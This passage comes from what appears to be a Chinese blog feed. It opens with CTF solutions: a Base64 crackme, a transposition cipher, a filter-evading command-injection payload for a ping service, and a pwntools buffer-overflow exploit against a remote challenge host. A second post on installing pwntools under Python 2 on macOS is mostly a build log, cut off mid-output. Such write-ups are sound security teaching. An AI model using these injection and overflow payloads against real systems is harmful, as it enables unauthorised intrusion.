class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>得到</p><p><img src="https://cdn.starryloki.com/2023/11/6ec7ea9675a06a606993fedf94d07f80.png" alt="image-20210825182711835"></p><p>发现密码错误, 尝试字母大写密码正确, 得到flag: <strong>hillstone{46f2fbee-3130-4af5-857e-981ad422160f}</strong></p><h3 id="java-app"><a href="#java-app" class="headerlink" title="java_app"></a>java_app</h3><p>拿到题目是一个Android的apk, 于是用Jeb打开看伪代码:</p><p><img src="https://cdn.starryloki.com/2023/11/18e7556c7caa4872aec4f3defe6200ea.png" alt="image-20210825181525942"></p><p>发现一个判断用户名密码的逻辑以及一个check()方法, 查看check方法看到字母表, 疑似是base64, 于是将password经过check()处理的字符串“yGlszHNUzWZl2UIU0W8WNFdSMXBsNGNl&#x2F;V5hwmRlI6FTyD5u0UgRL+FZ+&#x2F;U”和字母表进行base64解密, 得到flag: <strong>hillstone{B4se64_r3pl4ce_Table!!sh4nsH1-ayY}</strong></p><p><img src="https://cdn.starryloki.com/2023/11/8de66db4c55bb7d7e5976fb82a4ce0aa.png" alt="image-20210825181831408"></p><h3 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">text = &#x27;ilhstlneoTR&#123;N5A05PT11NC0PH1R&#125;3&#x27;<br><br>key = [3,1,2]<br><br>li0 = []<br>li1 = []<br>li2 = []<br>for i in range(0,len(text)):<br>    if i % 3 == 0:<br>        li0.append(text[i])<br>    elif (i - 1) % 3 == 0:<br>        li1.append(text[i])<br>    elif (i - 2) % 3 == 0:<br>        li2.append(text[i])<br>li = []<br>for i in range(len(li1)): <br>    li.append(li1[i]) <br>    li.append(li2[i])<br>    li.append(li0[i])<br><br># print(li)<br>print(&quot;The ciphered text is :&quot;)<br>ciphered_txt = (&#x27;&#x27;.join(li))<br>print(ciphered_txt)<br><br>#ilhstlneoTR&#123;N5A05PT11NC0PH1R&#125;3<br></code></pre></td></tr></table></figure><p>发现是将密码3个3个分组然后将最后一位移到最前面，直接手动分组移动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hillstone&#123;TRAN5P051T10NC1PH3R&#125;<br></code></pre></td></tr></table></figure><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>命令执行漏洞尝试使用分号绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">127.0.0.1;ls<br></code></pre></td></tr></table></figure><p>成功回显index.php和flag.php</p><p><img src="https://cdn.starryloki.com/2023/11/822bc6927c9f1991f2f3a87b55d3179d.png" alt="1"></p><p>尝试cat flag.php，发现ban了空格使用$IFS绕，过滤了flag和通配符，使用反引号绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?ip=127.0.0.1;cat$IFS$9`find$IFS$9.`<br></code></pre></td></tr></table></figure><p><img src="https://cdn.starryloki.com/2023/11/56667446617a2c1f3c60858b722e984c.png" alt="2"></p><h3 id="easystack（new）"><a href="#easystack（new）" class="headerlink" title="easystack（new）"></a>easystack（new）</h3><p>ida64查看附件, 发现vul()受害函数, 于是继续看, 发现gets(&amp;v1)存在栈溢出, 溢出大小为68, 构造exp得到flag:</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;81.70.89.91&quot;</span>,<span class="hljs-number">57001</span>)<br>backdoor=<span class="hljs-number">0x400729</span><br>pay=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+p64(backdoor)<br>p.recvuntil(<span class="hljs-string">&quot;hello!!!please give me your name\n&quot;</span>)<br>p.sendline(pay)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macOS11中安装pwntools with python2</title>
      <link href="/2021/08/04/macOS11%E4%B8%AD%E5%AE%89%E8%A3%85pwntools%20with%20python2/"/>
      <url>/2021/08/04/macOS11%E4%B8%AD%E5%AE%89%E8%A3%85pwntools%20with%20python2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在macOS Big Sur中通过pip3安装pwntools没有遇到什么问题, 但是通过pip2安装pwntools却遇到了错误: 编译安装unicorn时失败. 于是在这里记录一下解决方案</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>macOS 11.5.1 amd64</p><p>Python 2.7.16</p><p>pip 20.3.4</p><h3 id="pip安装"><a href="#pip安装" class="headerlink" title="pip安装"></a>pip安装</h3><p>pip安装时, 出现了这样的错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">❯ pip2 install pwn<br>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.<br>Defaulting to user installation because normal site-packages is not writeable<br>Collecting pwn<br>  Using cached pwn-1.0.tar.gz (1.1 kB)<br>Collecting pwntools<br>  Using cached pwntools-4.6.0-py2.py3-none-any.whl (10.0 MB)<br>Requirement already satisfied: capstone&gt;=3.0.5rc2 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (4.0.2)<br>Requirement already satisfied: colored-traceback in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (0.3.0)<br>Requirement already satisfied: ropgadget&gt;=5.3 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (6.5)<br>Requirement already satisfied: psutil&gt;=3.3.0 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (5.8.0)<br>Requirement already satisfied: intervaltree&gt;=3.0 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (3.1.0)<br>Requirement already satisfied: packaging in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (20.9)<br>Requirement already satisfied: sortedcontainers in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (2.3.0)<br>Requirement already satisfied: pyelftools&gt;=0.2.4 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (0.27)<br>Requirement already satisfied: mako&gt;=1.0.0 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (1.1.4)<br>Requirement already satisfied: pyserial&gt;=2.7 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (3.5)<br>Requirement already satisfied: pygments&gt;=2.0 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (2.5.2)<br>Requirement already satisfied: pysocks in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (1.7.1)<br>Collecting unicorn&lt;1.0.2rc4,&gt;=1.0.2rc1<br>  Downloading unicorn-1.0.2rc3.tar.gz (1.6 MB)<br>     |████████████████████████████████| 1.6 MB 905 kB/s<br>Collecting paramiko&gt;=1.15.2<br>  Downloading paramiko-2.7.2-py2.py3-none-any.whl (206 kB)<br>     |████████████████████████████████| 206 kB 971 kB/s<br>Requirement already satisfied: pip&gt;=6.0.8 in /Library/Python/2.7/site-packages (from pwntools-&gt;pwn) (20.3.4)<br>Requirement already satisfied: six&gt;=1.12.0 in /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python (from pwntools-&gt;pwn) (1.12.0)<br>Requirement already satisfied: python-dateutil in /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python (from pwntools-&gt;pwn) (1.5)<br>Requirement already satisfied: requests&gt;=2.0 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (2.23.0)<br>Requirement already satisfied: rpyc in /Users/loki/Library/Python/2.7/lib/python/site-packages (from pwntools-&gt;pwn) (4.1.5)<br>Requirement already satisfied: pyparsing&gt;=2.0.2 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from packaging-&gt;pwntools-&gt;pwn) (2.4.7)<br>Requirement already satisfied: MarkupSafe&gt;=0.9.2 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from mako&gt;=1.0.0-&gt;pwntools-&gt;pwn) (1.1.1)<br>Requirement already satisfied: cryptography&gt;=2.5 in /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python (from paramiko&gt;=1.15.2-&gt;pwntools-&gt;pwn) (2.9.2)<br>Collecting pynacl&gt;=1.0.1<br>  Downloading PyNaCl-1.4.0-cp27-cp27m-macosx_10_10_x86_64.whl (379 kB)<br>     |████████████████████████████████| 379 kB 918 kB/s<br>Collecting bcrypt&gt;=3.1.3<br>  Downloading bcrypt-3.1.7-cp27-cp27m-macosx_10_6_intel.whl (53 kB)<br>     |████████████████████████████████| 53 kB 1.1 MB/s<br>Requirement already satisfied: certifi&gt;=2017.4.17 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from requests&gt;=2.0-&gt;pwntools-&gt;pwn) (2020.12.5)<br>Requirement already satisfied: urllib3!=1.25.0,!=1.25.1,&lt;1.26,&gt;=1.21.1 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from requests&gt;=2.0-&gt;pwntools-&gt;pwn) (1.25.8)<br>Requirement already satisfied: idna&lt;3,&gt;=2.5 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from requests&gt;=2.0-&gt;pwntools-&gt;pwn) (2.10)<br>Requirement already satisfied: chardet&lt;4,&gt;=3.0.2 in /Users/loki/Library/Python/2.7/lib/python/site-packages (from requests&gt;=2.0-&gt;pwntools-&gt;pwn) (3.0.4)<br>Requirement already satisfied: plumbum in /Users/loki/Library/Python/2.7/lib/python/site-packages (from rpyc-&gt;pwntools-&gt;pwn) (1.7.0)<br>Requirement already satisfied: cffi!=1.11.3,&gt;=1.8 in /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python (from cryptography&gt;=2.5-&gt;paramiko&gt;=1.15.2-&gt;pwntools-&gt;pwn) (1.14.3)<br>Requirement already satisfied: enum34 in /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python (from cryptography&gt;=2.5-&gt;paramiko&gt;=1.15.2-&gt;pwntools-&gt;pwn) (1.1.6)<br>Requirement already satisfied: ipaddress in /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python (from cryptography&gt;=2.5-&gt;paramiko&gt;=1.15.2-&gt;pwntools-&gt;pwn) (1.0.22)<br>Requirement already satisfied: pycparser in /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python (from cffi!=1.11.3,&gt;=1.8-&gt;cryptography&gt;=2.5-&gt;paramiko&gt;=1.15.2-&gt;pwntools-&gt;pwn) (2.19)<br>Building wheels for collected packages: pwn, unicorn<br>  Building wheel for pwn (setup.py) ... done<br>  Created wheel for pwn: filename=pwn-1.0-py2-none-any.whl size=1219 sha256=c85d41546e84a524bc7a7da4778140308f156ef766147b195d9b9426fbccaa9a<br>  Stored in directory: /Users/loki/Library/Caches/pip/wheels/b5/47/e7/37ed277a804c6b0bb20b4a2395ea8434eb937f368319d8d0ab<br>  Building wheel for unicorn (setup.py) ... error<br>  ERROR: Command errored out with exit status 1:<br>   command: /System/Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/Python -u -c &#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;&quot;&#x27;&quot;&#x27;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&#x27;&quot;&#x27;&quot;&#x27;; __file__=&#x27;&quot;&#x27;&quot;&#x27;/private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/setup.py&#x27;&quot;&#x27;&quot;&#x27;;f=getattr(tokenize, &#x27;&quot;&#x27;&quot;&#x27;open&#x27;&quot;&#x27;&quot;&#x27;, open)(__file__);code=f.read().replace(&#x27;&quot;&#x27;&quot;&#x27;\r\n&#x27;&quot;&#x27;&quot;&#x27;, &#x27;&quot;&#x27;&quot;&#x27;\n&#x27;&quot;&#x27;&quot;&#x27;);f.close();exec(compile(code, __file__, &#x27;&quot;&#x27;&quot;&#x27;exec&#x27;&quot;&#x27;&quot;&#x27;))&#x27; bdist_wheel -d /private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-wheel-8pFtsB<br>       cwd: /private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/<br>  Complete output (399 lines):<br>  /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/setuptools/dist.py:472: UserWarning: Normalizing &#x27;1.0.2.rc3&#x27; to &#x27;1.0.2rc3&#x27;<br>    normalized_version,<br>  running bdist_wheel<br>  running build<br>  Building C extensions<br>  cd qemu &amp;&amp; \<br>  ./configure --cc=&quot;cc&quot; --extra-cflags=&quot;-DUNICORN_HAS_X86 -DUNICORN_HAS_ARM -DUNICORN_HAS_ARMEB -DUNICORN_HAS_M68K -DUNICORN_HAS_ARM64 -DUNICORN_HAS_ARM64EB -DUNICORN_HAS_MIPS -DUNICORN_HAS_MIPSEL -DUNICORN_HAS_MIPS64 -DUNICORN_HAS_MIPS64EL -DUNICORN_HAS_SPARC -fPIC -fvisibility=hidden&quot; --target-list=&quot;x86_64-softmmu, arm-softmmu, armeb-softmmu, m68k-softmmu, aarch64-softmmu, aarch64eb-softmmu, mips-softmmu, mipsel-softmmu, mips64-softmmu, mips64el-softmmu, sparc-softmmu,sparc64-softmmu,&quot; --python=/usr/bin/python<br>  Source path       /private/var/folders/6k/fdkg_n356c34dm04hrnj66k00000gn/T/pip-install-vxEjTg/unicorn/src/qemu<br>  C compiler        cc<br>  Host C compiler   cc<br>  Objective-C compiler clang<br>  ARFLAGS           rv<br>  CFLAGS            -g<br>  QEMU_CFLAGS       -m64 -DOS_OBJECT_USE_OBJC=0 -arch x86_64 -D_GNU_SOURCE -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE -Wstrict-prototypes -Wredundant-decls -Wall -Wundef -Wwrite-strings -Wmissing-prototypes -fno-strict-aliasing -fno-common -DUNICORN_HAS_X86 -DUNICORN_HAS_ARM -DUNICORN_HAS_ARMEB -DUNICORN_HAS_M68K -DUNICORN_HAS_ARM64 -DUNICORN_HAS_ARM64EB -DUNICORN_HAS_MIPS -DUNICORN_HAS_MIPSEL -DUNICORN_HAS_MIPS64 -DUNICORN_HAS_MIPS64EL -DUNICORN_HAS_SPARC -fPIC -fvisibility=hidden  -Wno-string-plus-int -Wno-initializer-overrides -Wendif-labels -Wmissing-include-dirs -Wempty-body -Wnested-externs -Wformat-security -Wformat-y2k -Winit-self -Wignored-qualifiers -Wold-style-definition -Wtype-limits -fstack-protector-strong<br>  LDFLAGS           -m64 -arch x86_64 -g -L/usr/local/opt/sqlite/lib<br>  make              make<br>  python            /usr/bin/python -B<br>  host CPU          x86_64<br>  host big endian   no<br>  target list       x86_64-softmmu  arm-softmmu  armeb-softmmu  m68k-softmmu  aarch64-softmmu  aarch64eb-softmmu  mips-softmmu  mipsel-softmmu  mips64-softmmu  mips64el-softmmu  sparc-softmmu sparc64-softmmu<br>  tcg debug enabled no<br>  strip binaries    yes<br>  static build      no<br>  mingw32 support   no<br>  PIE               no<br>  printf &quot;x86 m68k arm aarch64 mips sparc&quot; &gt; config.log<br>  /Library/Developer/CommandLineTools/usr/bin/make -C qemu -j4<br>    GEN   x86_64-softmmu/config-devices.mak<br>    GEN   arm-softmmu/config-devices.mak<br>    GEN   armeb-softmmu/config-devices.mak<br>    GEN   m68k-softmmu/config-devices.mak<br>    GEN   aarch64-softmmu/config-devices.mak<br>    GEN   aarch64eb-softmmu/config-devices.mak<br>    GEN   mips-softmmu/config-devices.mak<br>    GEN   mipsel-softmmu/config-devices.mak<br>    GEN   mips64-softmmu/config-devices.mak<br>    GEN   mips64el-softmmu/config-devices.mak<br>    GEN   sparc-softmmu/config-devices.mak<br>    GEN   sparc64-softmmu/config-devices.mak<br>    GEN   config-host.h<br>    GEN   qapi-types.h<br>    GEN   qapi-visit.h<br>    GEN   config-all-devices.mak<br>    CC    ../uc.o<br>    CC    ../list.o<br>    CC    glib_compat.o<br>    GEN   qapi-types.c<br>    GEN   qapi-visit.c<br>    CC    accel.o<br>    CC    vl.o<br>    CC    qemu-timer.o<br>    CC    qemu-log.o<br>    CC    tcg-runtime.o<br>    CC    hw/core/qdev.o<br>    CC    hw/core/machine.o<br>    CC    qom/object.o<br>    CC    qom/container.o<br>    CC    qom/qom-qobject.o<br>    CC    qom/cpu.o<br>    CC    qapi-types.o<br>    CC    qapi-visit.o<br>    CC    qapi/qapi-visit-core.o<br>    CC    qapi/qapi-dealloc-visitor.o<br>    CC    qapi/qmp-input-visitor.o<br>    CC    qapi/qmp-output-visitor.o<br>    CC    qapi/string-input-visitor.o<br>    CC    qobject/qint.o<br>    CC    qobject/qstring.o<br>    CC    qobject/qdict.o<br>    CC    qobject/qlist.o<br>    CC    qobject/qfloat.o<br>    CC    qobject/qbool.o<br>    CC    qobject/qerror.o<br>    CC    util/cutils.o<br>    CC    util/qemu-timer-common.o<br>    CC    util/oslib-posix.o<br>    CC    util/qemu-thread-posix.o<br>    CC    util/module.o<br>    CC    util/bitmap.o<br>    CC    util/bitops.o<br>    CC    util/error.o<br>    CC    util/aes.o<br>    CC    util/crc32c.o<br>    CC    util/host-utils.o<br>    CC    util/getauxval.o<br>    GEN   arm-softmmu/config-target.h<br>    GEN   armeb-softmmu/config-target.h<br>    GEN   x86_64-softmmu/config-target.h<br>    GEN   m68k-softmmu/config-target.h<br>    CC    arm-softmmu/exec.o<br>    CC    m68k-softmmu/exec.o<br>    CC    x86_64-softmmu/exec.o<br>    CC    armeb-softmmu/exec.o<br>    CC    m68k-softmmu/translate-all.o<br>    CC    armeb-softmmu/translate-all.o<br>    CC    x86_64-softmmu/translate-all.o<br>    CC    arm-softmmu/translate-all.o<br>    CC    m68k-softmmu/cpu-exec.o<br>    CC    arm-softmmu/cpu-exec.o<br>    CC    x86_64-softmmu/cpu-exec.o<br>    CC    armeb-softmmu/cpu-exec.o<br>    CC    m68k-softmmu/tcg/tcg.o<br>    CC    x86_64-softmmu/tcg/tcg.o<br>    CC    armeb-softmmu/tcg/tcg.o<br>    CC    arm-softmmu/tcg/tcg.o<br>    CC    m68k-softmmu/tcg/optimize.o<br>    CC    arm-softmmu/tcg/optimize.o<br>    CC    armeb-softmmu/tcg/optimize.o<br>    CC    x86_64-softmmu/tcg/optimize.o<br>    CC    m68k-softmmu/fpu/softfloat.o<br>    CC    armeb-softmmu/fpu/softfloat.o<br>    CC    arm-softmmu/fpu/softfloat.o<br>    CC    x86_64-softmmu/fpu/softfloat.o<br>    CC    m68k-softmmu/cpus.o<br>    CC    m68k-softmmu/ioport.o<br>    CC    arm-softmmu/cpus.o<br>    CC    armeb-softmmu/cpus.o<br>    CC    x86_64-softmmu/cpus.o<br>    CC    m68k-softmmu/memory.o<br>    CC    arm-softmmu/ioport.o<br>    CC    armeb-softmmu/ioport.o<br>    CC    x86_64-softmmu/ioport.o<br>    CC    m68k-softmmu/cputlb.o<br>    CC    armeb-softmmu/memory.o<br>    CC    arm-softmmu/memory.o<br>    CC    x86_64-softmmu/memory.o<br>    CC    armeb-softmmu/cputlb.o<br>    CC    arm-softmmu/cputlb.o<br>    CC    x86_64-softmmu/cputlb.o<br>    CC    m68k-softmmu/memory_mapping.o<br>    CC    m68k-softmmu/hw/m68k/dummy_m68k.o<br>    CC    armeb-softmmu/memory_mapping.o<br>    CC    arm-softmmu/memory_mapping.o<br>    CC    x86_64-softmmu/memory_mapping.o<br>    CC    m68k-softmmu/target-m68k/translate.o<br>    CC    armeb-softmmu/hw/arm/tosa.o<br>    CC    arm-softmmu/hw/arm/tosa.o<br>    CC    x86_64-softmmu/hw/intc/apic.o<br>    CC    armeb-softmmu/hw/arm/virt.o<br>    CC    arm-softmmu/hw/arm/virt.o<br>    CC    x86_64-softmmu/hw/intc/apic_common.o<br>    CC    armeb-softmmu/target-arm/translate.o<br>    CC    m68k-softmmu/target-m68k/op_helper.o<br>    CC    arm-softmmu/target-arm/translate.o<br>    CC    x86_64-softmmu/hw/i386/pc.o<br>    CC    m68k-softmmu/target-m68k/helper.o<br>    CC    x86_64-softmmu/hw/i386/pc_piix.o<br>    CC    x86_64-softmmu/target-i386/translate.o<br>    CC    m68k-softmmu/target-m68k/cpu.o<br>    CC    m68k-softmmu/target-m68k/unicorn.o<br>    CC    armeb-softmmu/target-arm/op_helper.o<br>    CC    x86_64-softmmu/target-i386/helper.o<br>    CC    armeb-softmmu/target-arm/helper.o<br>    CC    arm-softmmu/target-arm/op_helper.o<br>    GEN   aarch64-softmmu/config-target.h<br>    CC    aarch64-softmmu/exec.o<br>    CC    x86_64-softmmu/target-i386/cpu.o<br>    CC    arm-softmmu/target-arm/helper.o<br>    CC    aarch64-softmmu/translate-all.o<br>    CC    x86_64-softmmu/target-i386/excp_helper.o<br>    CC    armeb-softmmu/target-arm/cpu.o<br>    CC    aarch64-softmmu/cpu-exec.o<br>    CC    x86_64-softmmu/target-i386/fpu_helper.o<br>    CC    armeb-softmmu/target-arm/neon_helper.o<br>    CC    aarch64-softmmu/tcg/tcg.o<br>    CC    arm-softmmu/target-arm/cpu.o<br>    CC    arm-softmmu/target-arm/neon_helper.o<br>    CC    armeb-softmmu/target-arm/iwmmxt_helper.o<br>    CC    x86_64-softmmu/target-i386/cc_helper.o<br>    CC    aarch64-softmmu/tcg/optimize.o<br>    CC    arm-softmmu/target-arm/iwmmxt_helper.o<br>    CC    armeb-softmmu/target-arm/psci.o<br>    CC    x86_64-softmmu/target-i386/int_helper.o<br>    CC    armeb-softmmu/target-arm/unicorn_arm.o<br>    CC    aarch64-softmmu/fpu/softfloat.o<br>    CC    x86_64-softmmu/target-i386/svm_helper.o<br>    CC    arm-softmmu/target-arm/psci.o<br>    CC    armeb-softmmu/target-arm/crypto_helper.o<br>    CC    arm-softmmu/target-arm/unicorn_arm.o<br>    CC    x86_64-softmmu/target-i386/smm_helper.o<br>    CC    aarch64-softmmu/cpus.o<br>    CC    arm-softmmu/target-arm/crypto_helper.o<br>    CC    x86_64-softmmu/target-i386/misc_helper.o<br>    CC    x86_64-softmmu/target-i386/mem_helper.o<br>    CC    aarch64-softmmu/ioport.o<br>    CC    x86_64-softmmu/target-i386/seg_helper.o<br>    CC    aarch64-softmmu/memory.o<br>    GEN   aarch64eb-softmmu/config-target.h<br>    CC    aarch64eb-softmmu/exec.o<br>    GEN   mips-softmmu/config-target.h<br>    CC    mips-softmmu/exec.o<br>    CC    aarch64-softmmu/cputlb.o<br>    CC    x86_64-softmmu/target-i386/arch_memory_mapping.o<br>    CC    aarch64eb-softmmu/translate-all.o<br>    CC    mips-softmmu/translate-all.o<br>    CC    x86_64-softmmu/target-i386/unicorn.o<br>    CC    aarch64eb-softmmu/cpu-exec.o<br>    CC    aarch64-softmmu/memory_mapping.o<br>    CC    mips-softmmu/cpu-exec.o<br>    CC    aarch64eb-softmmu/tcg/tcg.o<br>    CC    aarch64-softmmu/hw/arm/tosa.o<br>    GEN   mipsel-softmmu/config-target.h<br>    CC    mipsel-softmmu/exec.o<br>    CC    mips-softmmu/tcg/tcg.o<br>    CC    aarch64-softmmu/hw/arm/virt.o<br>    CC    aarch64-softmmu/target-arm/translate.o<br>    CC    mipsel-softmmu/translate-all.o<br>    CC    aarch64eb-softmmu/tcg/optimize.o<br>    CC    mipsel-softmmu/cpu-exec.o<br>    CC    mips-softmmu/tcg/optimize.o<br>    CC    mipsel-softmmu/tcg/tcg.o<br>    CC    aarch64eb-softmmu/fpu/softfloat.o<br>    CC    mips-softmmu/fpu/softfloat.o<br>    CC    aarch64eb-softmmu/cpus.o<br>    CC    mipsel-softmmu/tcg/optimize.o<br>    CC    aarch64eb-softmmu/ioport.o<br>    CC    aarch64-softmmu/target-arm/op_helper.o<br>    CC    mips-softmmu/cpus.o<br>    CC    aarch64eb-softmmu/memory.o<br>    CC    mips-softmmu/ioport.o<br>    CC    mipsel-softmmu/fpu/softfloat.o<br>    CC    aarch64-softmmu/target-arm/helper.o<br>    CC    mips-softmmu/memory.o<br>    CC    aarch64eb-softmmu/cputlb.o<br>    CC    mips-softmmu/cputlb.o<br>    CC    mipsel-softmmu/cpus.o<br>    CC    aarch64eb-softmmu/memory_mapping.o<br>    CC    aarch64-softmmu/target-arm/cpu.o<br>    CC    mipsel-softmmu/ioport.o<br>    CC    aarch64eb-softmmu/hw/arm/tosa.o<br>    CC    mips-softmmu/memory_mapping.o<br>    CC    aarch64-softmmu/target-arm/neon_helper.o<br>    CC    mipsel-softmmu/memory.o<br>    CC    aarch64eb-softmmu/hw/arm/virt.o<br>    CC    mips-softmmu/hw/mips/mips_r4k.o<br>    CC    aarch64eb-softmmu/target-arm/translate.o<br>    CC    mipsel-softmmu/cputlb.o<br>    CC    mips-softmmu/hw/mips/addr.o<br>    CC    mips-softmmu/hw/mips/cputimer.o<br>    CC    aarch64-softmmu/target-arm/iwmmxt_helper.o<br>    CC    mips-softmmu/target-mips/translate.o<br>    CC    mipsel-softmmu/memory_mapping.o<br>    CC    aarch64-softmmu/target-arm/psci.o<br>    CC    mipsel-softmmu/hw/mips/mips_r4k.o<br>    CC    aarch64-softmmu/target-arm/cpu64.o<br>    CC    mipsel-softmmu/hw/mips/addr.o<br>    CC    aarch64-softmmu/target-arm/translate-a64.o<br>    CC    mipsel-softmmu/hw/mips/cputimer.o<br>    CC    mipsel-softmmu/target-mips/translate.o<br>    CC    aarch64eb-softmmu/target-arm/op_helper.o<br>    CC    aarch64eb-softmmu/target-arm/helper.o<br>    CC    aarch64-softmmu/target-arm/helper-a64.o<br>    CC    mips-softmmu/target-mips/dsp_helper.o<br>    CC    aarch64eb-softmmu/target-arm/cpu.o<br>    CC    aarch64-softmmu/target-arm/unicorn_aarch64.o<br>    CC    mips-softmmu/target-mips/op_helper.o<br>    CC    aarch64-softmmu/target-arm/crypto_helper.o<br>    CC    aarch64eb-softmmu/target-arm/neon_helper.o<br>    CC    mipsel-softmmu/target-mips/dsp_helper.o<br>    CC    mips-softmmu/target-mips/lmi_helper.o<br>    CC    aarch64eb-softmmu/target-arm/iwmmxt_helper.o<br>    CC    mipsel-softmmu/target-mips/op_helper.o<br>    CC    mips-softmmu/target-mips/helper.o<br>    GEN   mips64-softmmu/config-target.h<br>    CC    mips64-softmmu/exec.o<br>    CC    aarch64eb-softmmu/target-arm/psci.o<br>    CC    mips-softmmu/target-mips/cpu.o<br>    CC    aarch64eb-softmmu/target-arm/cpu64.o<br>    CC    mips64-softmmu/translate-all.o<br>    CC    mips-softmmu/target-mips/msa_helper.o<br>    CC    aarch64eb-softmmu/target-arm/translate-a64.o<br>    CC    mipsel-softmmu/target-mips/lmi_helper.o<br>    CC    mips64-softmmu/cpu-exec.o<br>    CC    mips64-softmmu/tcg/tcg.o<br>    CC    mipsel-softmmu/target-mips/helper.o<br>    CC    mipsel-softmmu/target-mips/cpu.o<br>    CC    mips-softmmu/target-mips/unicorn.o<br>    CC    mipsel-softmmu/target-mips/msa_helper.o<br>    CC    aarch64eb-softmmu/target-arm/helper-a64.o<br>    CC    mips64-softmmu/tcg/optimize.o<br>    CC    aarch64eb-softmmu/target-arm/unicorn_aarch64.o<br>    GEN   mips64el-softmmu/config-target.h<br>    CC    mips64el-softmmu/exec.o<br>    CC    aarch64eb-softmmu/target-arm/crypto_helper.o<br>    CC    mipsel-softmmu/target-mips/unicorn.o<br>    CC    mips64-softmmu/fpu/softfloat.o<br>    CC    mips64el-softmmu/translate-all.o<br>    CC    mips64-softmmu/cpus.o<br>    GEN   sparc-softmmu/config-target.h<br>    CC    sparc-softmmu/exec.o<br>    CC    mips64el-softmmu/cpu-exec.o<br>    CC    mips64-softmmu/ioport.o<br>    CC    mips64el-softmmu/tcg/tcg.o<br>    CC    sparc-softmmu/translate-all.o<br>    CC    mips64-softmmu/memory.o<br>    CC    mips64el-softmmu/tcg/optimize.o<br>    CC    sparc-softmmu/cpu-exec.o<br>    CC    mips64-softmmu/cputlb.o<br>    CC    sparc-softmmu/tcg/tcg.o<br>    GEN   sparc64-softmmu/config-target.h<br>    CC    mips64-softmmu/memory_mapping.o<br>    CC    sparc64-softmmu/exec.o<br>    CC    mips64el-softmmu/fpu/softfloat.o<br>    CC    sparc-softmmu/tcg/optimize.o<br>    CC    mips64-softmmu/hw/mips/mips_r4k.o<br>    CC    sparc64-softmmu/translate-all.o<br>    CC    mips64-softmmu/hw/mips/addr.o<br>    CC    sparc-softmmu/fpu/softfloat.o<br>    CC    mips64-softmmu/hw/mips/cputimer.o<br>    CC    mips64el-softmmu/cpus.o<br>    CC    sparc64-softmmu/cpu-exec.o<br>    CC    mips64-softmmu/target-mips/translate.o<br>    CC    mips64el-softmmu/ioport.o<br>    CC    sparc64-softmmu/tcg/tcg.o<br>    CC    mips64el-softmmu/memory.o<br>    CC    sparc-softmmu/cpus.o<br>    CC    sparc-softmmu/ioport.o<br>    CC    mips64el-softmmu/cputlb.o<br>    CC    sparc64-softmmu/tcg/optimize.o<br>    CC    